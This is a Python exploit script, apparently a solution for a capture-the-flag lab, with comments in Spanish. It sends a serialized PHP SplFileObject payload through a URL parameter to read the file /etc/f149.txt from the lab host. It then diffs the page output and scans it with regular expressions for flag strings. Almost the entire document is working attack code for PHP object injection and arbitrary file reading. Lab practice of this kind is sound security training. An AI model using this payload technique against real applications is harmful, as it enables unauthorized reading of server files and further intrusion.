#!/usr/bin/env python3
import requests
import urllib.parse

base_url = "http://hackme11.vulnmachines.com:8056"

print("[*] Lab 1 - PHP Object Injection Solution")
print("[*] Based on the SecOps article")
print()

# Según el artículo, cuando SplFileObject se imprime (echo/print), 
# muestra la primera línea del archivo
# El truco es que el objeto debe ser convertido a string

# Payload correcto para SplFileObject
# Necesitamos solo el filename, SplFileObject lo abrirá automáticamente
payload = 'O:13:"SplFileObject":1:{s:8:"filename";s:13:"/etc/f149.txt";}'

print(f"[*] Payload: {payload}")

encoded = urllib.parse.quote(payload)
url = f"{base_url}/params?vnm={encoded}"

print(f"[*] URL: {url}")
print()

response = requests.get(url)

# El contenido debería aparecer en algún lugar del HTML
# Vamos a buscar líneas que no estén en la respuesta normal
normal = requests.get(f"{base_url}/params?vnm=").text

# Dividir en líneas y comparar
response_lines = response.text.split('\n')
normal_lines = normal.split('\n')

print("[*] Looking for differences...")
for line in response_lines:
    if line not in normal_lines and line.strip():
        # Ignorar líneas HTML
        if not line.strip().startswith('<') and not line.strip().startswith('//'):
            if 'Notice' not in line and 'Warning' not in line:
                print(f"[+] Found: {line.strip()}")

# También buscar en el título o en cualquier lugar donde pueda aparecer
import re
flag_patterns = [
    r'vulnmachines{[^}]+}',
    r'flag{[^}]+}',
    r'FLAG{[^}]+}',
    r'vm{[^}]+}',
    r'[a-fA-F0-9]{32}',
]

for pattern in flag_patterns:
    matches = re.findall(pattern, response.text, re.IGNORECASE)
    if matches:
        print(f"\n[!!!] FLAG FOUND: {matches[0]}")
        break